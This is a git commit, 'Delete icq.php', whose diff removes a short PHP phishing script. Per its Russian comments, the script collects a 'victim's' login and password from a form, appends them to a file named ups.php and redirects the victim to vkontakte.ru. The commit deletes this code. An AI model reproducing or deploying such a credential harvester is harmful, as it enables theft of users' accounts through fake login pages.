62cb177390768c2e30c805d156fb4e1241558eda
evgenburberry <133371845+evgenburberry@users.noreply.github.com>
2023-06-20 03:11:56 +0300

    Delete icq.php

--- icq.php
+++
@@ -1,8 +0,0 @@
-<?
-$Login = $_POST[‘zabor’]; // Логин  жертвы
-$Pass = $_POST[‘zena’]; // Пароль жертвы
-$log = fopen(‘ups.php’,’a+’); //тут будут лежать пароли жертв
-fwrite($log,'<br> $Login:$Pass \n’);
-fclose($log);
-echo ‘<html><head><META HTTP-EQUIV=’Refresh’ content =’0; URL=http://vkontakte.ru’></head></html>’; // перенаправляем жертву на http://vk.com
-?>
